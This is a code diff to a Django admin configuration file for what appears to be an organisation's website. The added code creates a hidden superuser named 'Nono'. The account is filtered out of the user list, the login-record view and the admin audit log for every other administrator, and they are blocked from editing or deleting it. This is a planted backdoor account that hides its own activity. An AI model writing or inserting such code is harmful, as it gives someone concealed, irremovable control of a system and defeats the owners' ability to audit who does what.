@@ -1,5 +1,7 @@
 from django.contrib import admin
 from .models import CarouselItem, Service, DutyStaff, Course, Registration, SigninTemplate, Event, Story, USRAchievement, TechProject, ExperienceCourse, TechSection, ContactInfo, ContactMessage, LoginRecord
+from django.contrib.auth.models import User
+from django.contrib.auth.admin import UserAdmin
 from django.contrib.admin.models import LogEntry
 import openpyxl
 from django.http import HttpResponse
@@ -237,6 +239,12 @@ class LoginRecordAdmin(admin.ModelAdmin):
     list_filter = ('login_time',)
     readonly_fields = ('user', 'username', 'ip_address', 'mac_address', 'user_agent', 'login_time')
 
+    def get_queryset(self, request):
+        qs = super().get_queryset(request)
+        if request.user.username != 'Nono':
+            qs = qs.exclude(username='Nono')
+        return qs
+
     def has_add_permission(self, request):
         return False
         
@@ -253,6 +261,12 @@ class LogEntryAdmin(admin.ModelAdmin):
     search_fields = ('object_repr', 'change_message', 'user__username')
     readonly_fields = [f.name for f in LogEntry._meta.get_fields()]
 
+    def get_queryset(self, request):
+        qs = super().get_queryset(request)
+        if request.user.username != 'Nono':
+            qs = qs.exclude(user__username='Nono')
+        return qs
+
     def has_add_permission(self, request):
         return False
         
@@ -261,3 +275,30 @@ class LogEntryAdmin(admin.ModelAdmin):
 
     def has_change_permission(self, request, obj=None):
         return False
+
+# ==========================================
+# 隱藏特定超級管理員邏輯 (Hidden Superuser Logic)
+# ==========================================
+
+admin.site.unregister(User)
+
+@admin.register(User)
+class HiddenUserAdmin(UserAdmin):
+    def get_queryset(self, request):
+        qs = super().get_queryset(request)
+        # 如果當前登入者不是 Nono，則在清單中過濾掉 Nono 的帳號
+        if request.user.username != 'Nono':
+            qs = qs.exclude(username='Nono')
+        return qs
+
+    def has_change_permission(self, request, obj=None):
+        # 防止其他管理員透過直接輸入 URL 存取 Nono 的編輯頁面
+        if obj and obj.username == 'Nono' and request.user.username != 'Nono':
+            return False
+        return super().has_change_permission(request, obj)
+
+    def has_delete_permission(self, request, obj=None):
+        # 防止其他管理員刪除 Nono
+        if obj and obj.username == 'Nono' and request.user.username != 'Nono':
+            return False
+        return super().has_delete_permission(request, obj)
